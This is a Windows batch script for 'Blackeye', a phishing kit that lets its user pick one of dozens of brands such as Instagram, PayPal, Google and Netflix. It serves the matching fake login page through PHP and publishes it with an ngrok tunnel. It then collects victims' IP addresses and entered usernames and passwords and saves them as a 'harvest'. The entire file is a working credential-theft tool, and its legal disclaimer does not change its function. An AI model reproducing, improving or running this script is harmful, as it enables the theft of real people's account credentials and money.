@echo off

rem Put the directory containing php in the next line. "" required.
set php="php-8.0.6"
set mylink="https://github.com/hide/"

:main
	call :banner
	call :menu
exit /b 0

rem Option Menu
:menu
	echo.
	echo						      MENU
	echo.
	echo.
	echo  [01] Instagram		[11] WordPress		[21] GitLab		[31] BitCoin
	echo  [02] FaceBook		[12] Microsoft		[22] Twitch		[32] PlayStation
	echo  [03] SnapChat		[13] IGFollowers	[23] MySpace		[33] Shopping
	echo  [04] Twitter		[14] Pinterest		[24] Badoo		[34] Amazon
	echo  [05] GithHub		[15] AppleID		[25] VK			[34] iCloud
	echo  [06] Google		[16] Verizon		[26] Yandex		[36] Spotify
	echo  [07] Origin		[17] DropBox		[27] DevianART		[37] Netflix
	echo  [08] Yahoo		[18] Adobe		[28] WiFi		[38] (ADVANCED) Custom page
	echo  [09] LinkedIn		[19] Shopify		[29] PayPal		[39] Extra Tools
	echo  [10] ProtonMail	[20] Messenger		[30] Steam		Press Enter to Exit
	echo.
	echo.
	set /p sel="Enter your choice (Enter to Exit): "

		       if "%sel%"=="01" ( set server=Instagram
		) else if "%sel%"=="02" ( set server=FaceBook
		) else if "%sel%"=="03" ( set server=SnapChat
		) else if "%sel%"=="04" ( set server=Twitter
		) else if "%sel%"=="05" ( set server=Github
		) else if "%sel%"=="06" ( set server=Google
		) else if "%sel%"=="07" ( set server=Origin
		) else if "%sel%"=="08" ( set server=Yahoo
		) else if "%sel%"=="09" ( set server=LinkedIn
		) else if "%sel%"=="10" ( set server=ProtonMail
		) else if "%sel%"=="11" ( set server=WordPress
		) else if "%sel%"=="12" ( set server=MicroSoft
		) else if "%sel%"=="13" ( set server=InstaFollowers
		) else if "%sel%"=="14" ( set server=Pinterest
		) else if "%sel%"=="15" ( set server=AppleID
		) else if "%sel%"=="16" ( set server=Verizon
		) else if "%sel%"=="17" ( set server=DropBox
		) else if "%sel%"=="18" ( set server=Adobe
		) else if "%sel%"=="19" ( set server=Shopify
		) else if "%sel%"=="20" ( set server=Messenger
		) else if "%sel%"=="21" ( set server=GitLab
		) else if "%sel%"=="22" ( set server=Twitch
		) else if "%sel%"=="23" ( set server=MySpace
		) else if "%sel%"=="24" ( set server=Badoo
		) else if "%sel%"=="25" ( set server=VK
		) else if "%sel%"=="26" ( set server=Yandex
		) else if "%sel%"=="27" ( set server=DevianART
		) else if "%sel%"=="28" ( set server=WiFi
		) else if "%sel%"=="29" ( set server=PayPal
		) else if "%sel%"=="30" ( set server=Steam
		) else if "%sel%"=="31" ( set server=BitCoin
		) else if "%sel%"=="32" ( set server=PlayStation
		) else if "%sel%"=="33" ( set server=Shopping
		) else if "%sel%"=="34" ( set server=Amazon
		) else if "%sel%"=="35" ( set server=iCloud
		) else if "%sel%"=="36" ( set server=Spotify
		) else if "%sel%"=="37" ( set server=Netflix
		) else if "%sel%"=="38" ( set /p server="Enter full path to directory containing index file of your custom page: "
		) else if "%sel%"=="39" (
			echo.
			echo 				Not available yet!
			echo 	Will be available in version 2.0 and later. Current version is 1.0.
			echo.
			echo Check for updates? (y/n)
			choice /cs /c yYnN >nul
			set ck=%ERRORLEVEL%
			if %ck%==1 (
				start "" %mylink%
			)
			if %ck%==2 (
				start "" %mylink%
			)
			call :main
		) else if "%sel%"=="" ( goto end
		) else ( echo Wrong Choice! Try Again
			timeout /t 2 >nul 
			call :main )
	call :exec
exit /b 0

:checkdirectory
	if "%~dp0"=="%CD%\" exit /b 0
	echo 	Your Currect Directory is %CD%. Changing directory to "%~dp0", location of "%~n0"
	echo 	Use popd command to return to previous directory.
	Pushd "%~dp0"
	echo.
	echo Press Enter to Continue.
	pause >nul 2>&1
	cls
exit /b 0

:checkfiles
	call :checkdirectory
	set file=1
	if not exist ngrok.exe ( set file=0
		echo ngrok.exe
	)
	if not exist jq.exe ( set file=0
		echo jq.exe
	)
	if not exist .\\%php%\php.exe ( set file=0
		echo php
	)
	
	if "%file%"=="0" ( echo.
	echo Fatal error! The above mentioned files are missing from "%CD%". If you did not move any files, please report this error.
	echo Open GitHub to report issue? (y/n):
	choice /cs /c yYnN >nul
	set ck=%ERRORLEVEL%
	if %ck%==1 start "" %mylink%
	if %ck%==2 start "" %mylink%
	goto end
	)
	
	set serv=1
	if not exist "sites\%server%\index.php" ( set serv=0
		echo index.php
	)
	if not exist "sites\%server%\login.html" (
		if not exist "sites\%server%\index.html" ( set serv=0
			echo index.html or login.html
		)
	)
	if not exist "sites\%server%\ip.php" ( set serv=0
		echo ip.php
	)
	
	if "%serv%"=="0" ( echo.
	echo "%server%" error! The above mentioned files are missing from "%CD%\sites\%server%". If you did not move any files, please report this error.
	echo Open GitHub to report issue? (y/n):
	choice /cs /c yYnN >nul
	set ck=%ERRORLEVEL%
	if %ck%==1 start "" %mylink%
	if %ck%==2 start "" %mylink%
	goto end
	)

exit /b 0

:stop
	taskkill /f /im php.exe >nul 2>&1
	taskkill /f /im ngrok.exe >nul 2>&1
exit /b 0

:banner
	cls
	echo 					    DISCLAIMER
	echo 		 Phishing is illegal. Usage of any hacking tools for hacking targets
	echo 		  without prior mutual written consent is illegal and punishable by
	echo 		 law. It's the end user's responsibility to obey all applicable laws.
	echo 		Developers assume no liability and are not responsible for any misuse
	echo 		                 or damage caused by this program.
	echo.
	echo 				   BLACKEYE FOR WINDOWS By @HiDe
	echo.
exit /b 0

:save
	call :stop
	more "sites\%server%\ip.txt" >> "results\%server%\ip.txt"
	more "sites\%server%\usernames.txt" >> "results\%server%\usernames.txt"
	echo.
	echo Harvest Saved in "%CD%\results\%server%\usernames.txt"
	echo.
	echo Press Enter to Continue...
	pause >nul
	call :main
exit /b 0

:harvestcredentials
	setlocal enableextensions enabledelayedexpansion
	set /a count=0
	for /f "tokens=* delims=IP" %%p in ('findstr /c:"IP:" "sites\%server%\usernames.txt"') do (
		set /a count+=1
	)
	endlocal && set total=%count%
	echo.
	echo.
	echo						   Credential Harvest from %total% victims:
	echo.
	more "sites\%server%\usernames.txt"
	echo.
	echo Press S to stop %server% server and save the Harvest...
	choice /t 5 /c RS /D R /N >nul 2>&1
	set ch=%ERRORLEVEL%
	if %ch%==1 call :catchip
	call :save
exit /b 0

:getcredentials
	echo.
	echo						        Harvesting Credentials...
	:dowhile1
		if exist "sites\%server%\usernames.txt" (
			call :harvestcredentials
			exit /b 0
		)
		timeout /t 5 >nul 2>&1
	if 1==1 goto dowhile1
	:end1
exit /b 0

:catchip
	mkdir "results\%server%\" >nul 2>nul
	
	setlocal enableextensions enabledelayedexpansion
	set /a count=0
	for /f "tokens=* delims=IP" %%p in ('findstr /c:"IP:" "sites\%server%\ip.txt"') do (
		set /a count+=1
	)
	endlocal && set total=%count%
	cls
	echo Phishing page link: %link%
	echo.
	echo.
	echo					The following %total% victim(s) opened the %server% Phishing link:
	echo.
	more "sites\%server%\ip.txt"
	call :getcredentials
exit /b 0

:checkfound
	cls
	echo Phishing page link: %link%
	echo.
	echo.
	echo					  Waiting for Victim(s) to open the %server% Phishing link...
	:dowhile1
		if exist "sites\%server%\ip.txt" (
			call :catchip
			exit /b 0
		)
		timeout /t 5 >nul 2>&1
	if 1==1 goto dowhile1
	:end1
exit /b 0

:exec
	call :checkfiles

	rem Create results directory
	mkdir results >nul 2>&1

	call :stop             rem To stop php and ngrok if running
	del /f "sites\%server%\usernames.txt" >nul 2>&1
	del /f "sites\%server%\ip.txt" >nul 2>&1

	start /b "" .\\%php%\php.exe -S localhost:80 -t "sites\%server%\" >nul 2>&1
	start /b "" ngrok http 80 >nul 2>&1

	cls
	echo Phishing page link: Generating! You will be redirected to the ngrok tunnels page. Please Wait...
	echo.
	echo.
	echo							Starting %server% Server...
	echo.
	timeout /t 5 /nobreak >nul
	for /f %%l in ('curl --silent http://127.0.0.1:4040/api/tunnels ^| jq .tunnels[0].public_url') do set link=%%l
	start "" http://localhost:4040
	call :checkfound
exit /b 0

:end